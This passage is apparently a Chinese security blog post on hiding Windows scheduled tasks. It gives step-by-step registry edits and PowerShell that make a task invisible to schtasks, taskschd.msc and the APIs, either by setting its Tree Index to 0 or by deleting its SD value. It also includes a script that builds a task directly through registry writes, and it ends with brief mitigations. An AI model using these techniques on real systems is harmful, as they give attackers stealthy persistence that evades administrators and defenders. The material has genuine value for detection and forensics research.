\- [IRegisteredTask::SetSecurityDescriptor](https://docs.microsoft.com/en-us/windows/win32/api/taskschd/nf-taskschd-iregisteredtask-setsecuritydescriptor)
通过这些 API 可以实现设置 TASK 的 SD 信息。我尝试使用项目
[TaskScheduler](https://github.com/dahall/TaskScheduler) 进行任务的创建，它用起来会更方便一些：
    using System;
    using System.Security.Principal;
    using System.Security.AccessControl;
    using Microsoft.Win32.TaskScheduler;
    namespace SchTaskOpt
    {
        class Program
        {
            static void Main(string[] args)
            {
                TaskDefinition td = TaskService.Instance.NewTask();
                td.RegistrationInfo.Description = "do something";
                td.Principal.RunLevel = TaskRunLevel.Highest;
                td.Principal.LogonType = TaskLogonType.ServiceAccount;
                td.Principal.UserId = "SYSTEM";
                td.RegistrationInfo.SecurityDescriptorSddlForm = @"D:P(D;;DCLCWPDTSD;;;IU)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)";
                DailyTrigger dt = new DailyTrigger();
                dt.StartBoundary = DateTime.Now;
                dt.DaysInterval = 1;
                dt.Repetition.Interval = TimeSpan.FromMinutes(1);
                //td.Triggers.Add(dt);
                td.Actions.Add("notepad", null, null);
                Task t =  TaskService.Instance.RootFolder.RegisterTaskDefinition(path:"test2", definition:td, TaskCreation.CreateOrUpdate, null, null, TaskLogonType.ServiceAccount);
                Console.WriteLine("success!!");
                //TaskSecurity ts = new TaskSecurity(t);
                //ts.AddAccessRule(new TaskAccessRule(new SecurityIdentifier(WellKnownSidType.AuthenticatedUserSid, null), TaskRights.Read | TaskRights.Write | TaskRights.ReadAttributes, AccessControlType.Deny));
                //t.SetAccessControl(ts);
                Console.WriteLine("success!!");
            }
        }
    }
但不幸的是报错了，无论是通过管理员运行还是 SYSTEM，都无法另其正常运作：
    PS C:\source\SchTaskOpt\bin\> .\SchTaskOpt.exe
    未经处理的异常:  System.Runtime.InteropServices.COMException: 异常来自 HRESULT:0xD0000061
       在 Microsoft.Win32.TaskScheduler.V2Interop.ITaskFolder.RegisterTaskDefinition(String Path, ITaskDefinition pDefinition, Int32 flags, Object UserId, Object password, TaskLogonType LogonType, Object sddl)
       在 Microsoft.Win32.TaskScheduler.TaskFolder.RegisterTaskDefinition(String path, TaskDefinition definition, TaskCreation createType, String userId, String password, TaskLogonType logonType, String sddl)
这个疑问先保留一下吧，需要清楚知道注册表中每个任务自动生成的 SD
格式才有头绪，这份[类型结构清点](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/)也许会排上用场。
## 计划任务隐藏新姿势
臆想一下，如果知道注册表里的所有结构形式及其意义，就可以手动通过添加注册表的方式进行创建计划任务，实际对该注册表项了解的并不是很清楚，所以只能做一些计划任务隐藏删除排查的工作。
我对计划任务隐藏的手法进行深入探究，经过不断测试，发现两种隐藏任务的方式。
### 非完全隐藏
如果想要隐藏一个计划任务，可以通过修改 Schedule\TaskCache\Tree 中对应任务的 Index 值，一般情况下都是 3，步骤如下：
  * 启动 SYSTEM 权限 cmd：`psexec64 -i -s cmd.exe`
  * 执行 regedit 以 SYSTEM 权限启动注册表编辑器
  * 修改 `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree` 下对应任务的 Index 值为 `0`
  * 删除 `%SystemRoot%\System32\Tasks` 下任务对应的 XML 文件
优点： \- 利用 taskschd.msc、schtasks 甚至系统API查询出的所有任务中，都看不到该任务
缺点： \- 并非完全隐藏，如果知道该任务的名字，可以通过 `schtasks /query /tn {TaskName}` 查到 \-无论是低权的任务还是高权，都需要 SYSTEM 权限（在win10测试，低版本好像没这个要求，待测试）
#### 测试用例
    PS C:\> schtasks.exe /create /tn test /tr "calc.exe" /sc minute /mo 1 /ru "administrator"
    成功: 成功创建计划任务 "test"。
    PS C:\> schtasks.exe /query /tn test
    文件夹: \
    任务名                                   下次运行时间           模式
    ======================================== ====================== ===============
    test                                     2021/1/11 14:54:00     就绪
    PS C:\> schtasks.exe /query|findstr test
    test                                     2021/1/11 14:55:00     ??
    PS C:\> Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\test" -Name "Index" -Value 0
    PS C:\> schtasks.exe /query|findstr test
    PS C:\> schtasks.exe /delete /tn test /f
    成功: 计划的任务 "test" 被成功删除。
    PS C:\>
#### 原理探究
Index 的含义未知，这个暂时不做探讨。
### 完全隐藏
按道理，是可以通过配置任务 SD 实现。在一次测试过程中，偶然删除了注册表中的 SD 项，发现无论什么方式都查不到任务信息，达到完全隐藏的目的：
  * 启动 SYSTEM 权限 cmd：`psexec64 -i -s cmd.exe`
  * 执行 regedit 以 SYSTEM 权限启动注册表编辑器
  * 删除 `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\{TaskName}\SD`
  * 删除 `%SystemRoot%\System32\Tasks` 下任务对应的 XML 文件
优点： \- 无论何种方式（除了注册表），都查不到该任务，较为彻底
缺点： \- 无论是低权的任务还是高权，都需要 SYSTEM 权限（在win10测试，低版本好像没这个要求，待测试）
#### 测试用例
下面是测试用的 powershell 代码（不通用，里面涉及的二进制内容需要先dump一个正常创建的任务）：
    $taskname = "test"
    $uuid = "{3EC79FBB-0533-4356-89B3-8CE2003F1CD8}"
    $cmd = "calc.exe"
    New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\" -Name $uuid
    New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\$uuid\" -Name "Path" -Value "\$taskname" -Type String -Force
    New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\$uuid\" -Name "URI" -Value "\$taskname" -Type String -Force
    New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\$uuid\" -Name "Schema" -Value 0x00010002 -Type DWORD -Force
    $triggerstring = "FwAAAAAAAAABBwEAAAAIAAAI/NDz5dYBAAcBAAAACAD//////////zghQUNISEhI38PL80hISEgOAAAASEhISEEAdQB0AGgAbwByAAAASEgAAAAASEhISABISEhISEhIAEhISEhISEgBAAAASEhISBwAAABISEhIAQUAAAAAAAUVAAAAEXy5KUkCH0AHyc8n6AMAAEhISEgsAAAASEhISFQARQBDAEgATABJAFUAMQAwADUANwBcAHQAZQBjAGgAbABpAHUAAAAAAAAASEhISCwAAABISEhIWAIAABAOAACA9AMA/////wcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABISEhI3d0AAAAAAAABBwEAAAAIAAAI/NDz5dYBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8AAAAAAAAAP////8AAAAAAAAAAAAAAAAAAcVLAQAAAAAAAAB2oQAAAAAAAEhISEg="
    $triggerbytes = [System.Convert]::FromBase64String($triggerstring)
    $actionbytes = [byte[]](0x03,0x00,0x0c,0x00,0x00,0x00,0x41,0x00,0x75,0x00,0x74,0x00,0x68,0x00,0x6f,0x00,0x72,0x00,0x66,0x66,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x00) + [System.Text.Encoding]::Unicode.GetBytes($cmd) + [byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)
    New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\$uuid\" -Name "Triggers" -Value $triggerbytes -Type binary -Force
    New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\$uuid\" -Name "Actions" -Value $actionbytes -Type binary -Force
    New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree" -Name $taskname -Force
    New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$taskname" -Name "Id" -Value "{3EC79FBB-0533-4356-89B3-8CE2003F1CD8}" -Type string -Force
    New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$taskname" -Name "Index" -Value 0x3 -Type DWORD -Force
    #Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$taskname" -Force
    #Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\$uuid" -Force
更通用一些的测试用例：
    PS C:\> schtasks.exe /create /tn test /tr "calc.exe" /sc minute /mo 1 /ru "administrator"
    成功: 成功创建计划任务 "test"。
    PS C:\> schtasks.exe /query /tn test
    文件夹: \
    任务名                                   下次运行时间           模式
    ======================================== ====================== ===============
    test                                     2021/1/11 14:56:00     就绪
    PS C:\> schtasks.exe /query|findstr test
    test                                     2021/1/11 14:56:00     ??
    PS C:\> Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\test" -Name "SD"
    PS C:\> schtasks.exe /query /tn test
    错误: 系统找不到指定的文件。
    PS C:\> schtasks.exe /query|findstr test
    PS C:\>
这种方式创建的计划任务，删除要相对麻烦一些：
    $taskname = "test"
    $uuid = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$taskname" -Name "Id").Id
    Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\$uuid"
    Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$taskname"
    sc.exe stop schedule
    sc.exe start schedule
#### 原理探究
经过进程监控，发现在计划任务信息查询过程中的流程如下：
  * 查询 `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\SD`，查的到继续，查不到则终止查询
  * 遍历查询 `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\{TaskName}` 中的 Id、Index、SD等值
  * （后面都是猜测）
  * 查询到的 SD 值，会对之后是否有权限查看该任务信息有影响，查不查的到和这个值息息相关
  * 根据 SD 值，进行权限检查
    * 如果权限通过，格式化输出 `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{TaskId}` 中的任务详细信息
    * 权限不通过，则进行下一个任务的查询
正常任务查询：
删除 SD 后的任务查询：
可见，因为找不到任务的 SD 信息，无法确定用户是否有权限查看该任务信息，导致系统直接判定无权限查看：
## 缓解计划任务的恶意利用
  1. 配置计划任务只允许运行在认证用户上，不可以通过 SYSTEM 账户运行，可以在 GPO 中进行配置，参考 [Allow server operators to schedule tasks](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/jj852168\(v=ws.11\)?redirectedfrom=MSDN)
  2. 配置只允许 administrators 用户组对进程的优先级进行修改，可以在 GPO 中配置，参考 [Increase scheduling priority](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn221960\(v=ws.11\)?redirectedfrom=MSDN)
## 参考
* * *